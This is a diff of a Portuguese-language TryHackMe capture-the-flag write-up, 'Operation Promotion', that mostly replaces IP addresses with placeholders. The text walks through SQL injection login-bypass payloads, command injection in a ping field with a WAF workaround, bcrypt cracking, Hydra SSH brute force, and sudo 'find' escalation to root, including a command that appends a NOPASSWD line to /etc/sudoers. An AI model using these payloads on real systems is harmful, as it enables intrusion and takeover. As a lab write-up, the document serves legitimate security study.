@@ -1,30 +1,11 @@
-# 🎯 TryHackMe — Operation Promotion
+#  TryHackMe — Operation Promotion
 
 > **Writeup de CTF da plataforma TryHackMe.**
 > Documento com fins **exclusivamente educacionais**. Técnicas aplicadas em ambiente controlado e autorizado.
 > Use este material apenas para estudo. Testar sistemas sem autorização é crime.
 
 ---
-
-## 📖 Sumário
-
-- [Visão Geral](#-visão-geral)
-- [Reconhecimento](#-reconhecimento)
-- [Enumeração Web](#-enumeração-web)
-- [SQL Injection no Login](#-sql-injection-no-login)
-- [IDOR & Command Injection](#-idor--command-injection)
-- [Coleta de Credenciais](#-coleta-de-credenciais)
-- [Quebra do Hash Bcrypt](#-quebra-do-hash-bcrypt)
-- [Acesso SSH](#-acesso-ssh)
-- [Escalação de Privilégios](#-escalação-de-privilégios)
-- [Flag](#-flag)
-- [Lições Aprendidas](#-lições-aprendidas)
-- [Ferramentas Utilizadas](#-ferramentas-utilizadas)
-- [Disclaimer](#️-disclaimer)
-
----
-
-## 🧭 Visão Geral
+##  Visão Geral
 
 | Campo | Valor |
 |:------|:------|
@@ -54,12 +35,12 @@ SQLi (login) ─▶ Admin Panel ─▶ IDOR ─▶ Command Injection ─▶ RCE 
 
 ---
 
-## 🔎 Reconhecimento
+##  Reconhecimento
 
 ### Varredura de portas
 
 ```bash
-nmap -sV -sC <***.***.**.*>
+nmap -sV -sC <Ip>
 ```
 
 **Resultado:**
@@ -81,7 +62,7 @@ PORT    STATE SERVICE     VERSION
 ### Enumeração de diretórios
 
 ```bash
-gobuster dir -u http://<***.**.**.**>:80 \
+gobuster dir -u http://<Ip>:80 \
   -w ~/Desktop/Pentest/SecLists/Discovery/Web-Content/common.txt \
   -x .php,zip
 ```
@@ -95,9 +76,9 @@ gobuster dir -u http://<***.**.**.**>:80 \
 
 ---
 
-## 🌐 Enumeração Web
+## Enumeração Web
 
-Ao acessar `http://10.67.181.142/admin/`, deparamo-nos com uma tela de login administrativa.
+Ao acessar `http://<Ip>/admin/`, deparamo-nos com uma tela de login administrativa.
 
 **Teste manual de SQL Injection:**
 
@@ -114,7 +95,7 @@ Senha:   qualquer_coisa
 • admin'/*
 ```
 
-✅ **A aplicação é vulnerável a SQL Injection no formulário de login**, permitindo bypass completo da autenticação.
+ **A aplicação é vulnerável a SQL Injection no formulário de login**, permitindo bypass completo da autenticação.
 
 Dentro do painel, encontramos a funcionalidade **"User Lookup Record"**, acessível via `/admin/users/lookup.php?id=<id>`.
 
@@ -128,7 +109,7 @@ Um utilitário que executa `ping` internamente — **forte candidato a Command I
 
 ---
 
-## 💉 SQL Injection no Login
+##  SQL Injection no Login
 
 O bypass via SQLi foi o **ponto de entrada** da aplicação. Utilizando o clássico `admin'-- -`, foi possível obter sessão como administrador sem conhecer a senha original.
 
@@ -149,7 +130,7 @@ Após o `--`, tudo após é ignorado, e a consulta retorna o usuário `admin`.
 
 ---
 
-## 🎣 IDOR & Command Injection
+##  IDOR & Command Injection
 
 ### IDOR (Insecure Direct Object Reference)
 
@@ -188,7 +169,7 @@ PING 120.0.0.1 (120.0.0.1) 56(84) bytes of data.
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
 ```
 
-✅ **Confirmação de RCE (Remote Code Execution)** como usuário `www-data`.
+**Confirmação de RCE (Remote Code Execution)** como usuário `www-data`.
 
 > 💡 **Nota sobre o WAF:** a aplicação bloqueia `127.0.0.1` no parâmetro `host` (retorna `Forbidden.`), mas aceita outros IPs como `120.0.0.1`. Também é preciso enviar User-Agent de navegador (`-A "Mozilla/5.0 ..."`) e o cookie `PHPSESSID` válido quando usando `curl`. Pelo navegador, com sessão ativa, funciona direto.
 
@@ -224,7 +205,7 @@ Com o RCE confirmado, exploramos o sistema de arquivos:
 
 ---
 
-## 🔑 Coleta de Credenciais
+##  Coleta de Credenciais
 
 Lendo o arquivo de configuração da aplicação:
 
@@ -264,7 +245,7 @@ Bcrypt é **lento por design** — brute force direto em wordlist grande é invi
 
 ---
 
-## 🔨 Quebra do Hash Bcrypt
+##  Quebra do Hash Bcrypt
 
 ### Tentativa direta com rockyou
 
@@ -274,7 +255,7 @@ john --format=bcrypt \
   hash.txt
 ```
 
-❌ **Sem resultado.** O hash não estava no rockyou puro.
+ **Sem resultado.** O hash não estava no rockyou puro.
 
 ### Estratégia baseada em contexto
 
@@ -294,28 +275,28 @@ O `dive.rule` gera mutações (adição de caracteres, capitalização, etc.) �
 ### Ataque de força bruta SSH com Hydra
 
 ```bash
-hydra -l <****> -P senha.txt <**.**.**.***> ssh
+hydra -l <user> -P senha.txt <Ip> ssh
 ```
 
 **Resultado:**
 
 ```text
-[22][ssh] host: <**.**.***.***>   login: <****>   password: <******>
+[22][ssh] host: <ip>   login: <nome>   password: <senha>
 1 of 1 target successfully completed, 1 valid password found
 ```
 
-🎉 **Senha encontrada:** `spring2026!`
+**Senha encontrada:** `spring2026!`
 
-> 💡 A palavra `<****>` com `*` no final foi uma das mutações geradas — a escolha de senha de `<***>` era fraca e previsível, mesmo com bcrypt. O `<*>` é uma das adições mais comuns no final de senhas.
+> A palavra `<****>` com `*` no final foi uma das mutações geradas — a escolha de senha de `<***>` era fraca e previsível, mesmo com bcrypt. O `<*>` é uma das adições mais comuns no final de senhas.
 
 **Alternativa:** também poderia ter sido tentada com `hashcat -m 3200 senha.txt hash.txt` diretamente contra o bcrypt (mais rápido que Hydra, pois o hash fica local), mas Hydra confirma a credencial contra o serviço real.
 
 ---
 
-## 🔐 Acesso SSH
+## Acesso SSH
 
 ```bash
-ssh <***>@100.100.101.112
+ssh <User>@<Ip>
 # senha: <*********>
 ```
 
@@ -330,11 +311,9 @@ jford@recruitcorp:~$cat user.txt
 THM{************}
 ```
 
-✅ **Acesso inicial ao sistema. Flag de usuário obtida.**
-
 ---
 
-## 🚀 Escalação de Privilégios
+## Escalação de Privilégios
 
 ### Enumeração de sudoers
 
@@ -370,7 +349,7 @@ Isso abre um shell cujo EUID é `0` (root). O `-quit` faz com que o `find` encer
 uid=0(root) gid=0(root) groups=0(root)
 ```
 
-✅ **Escalação bem-sucedida para root.**
+**Escalação bem-sucedida para root.**
 
 ### Alternativas de exploração do `find`
 
@@ -387,7 +366,7 @@ sudo find / -exec /bin/sh -c 'echo "jford ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoe
 
 ---
 
-## 🏁 Flag
+##  Flag
 
 ```bash
 # cd /root
@@ -400,7 +379,7 @@ THM{*************************}
 
 ---
 
-## 📚 Lições Aprendidas
+##  Lições Aprendidas
 
 ### Vulnerabilidades exploradas
 
@@ -413,7 +392,7 @@ THM{*************************}
 | 5 | **Hash bcrypt com senha fraca/previsível** | Comprometimento via regras |
 | 6 | **Sudo `NOPASSWD` em `find`** | Escalação para root |
 
-## 🛠 Ferramentas Utilizadas
+##  Ferramentas Utilizadas
 
 | Ferramenta | Uso |
 |:--|:--|
@@ -427,8 +406,3 @@ THM{*************************}
 | **GTFOBins** | Referência para escalação via `find` |
 
 ---
-
-<div align="center">
-  <i>TryHackMe — Operation Promotion · Writeup</i><br/>
-  <b>⭐⭐⭐ Se este writeup te ajudou, deixe uma estrela no repositório! ⭐⭐⭐</b>
-</div>
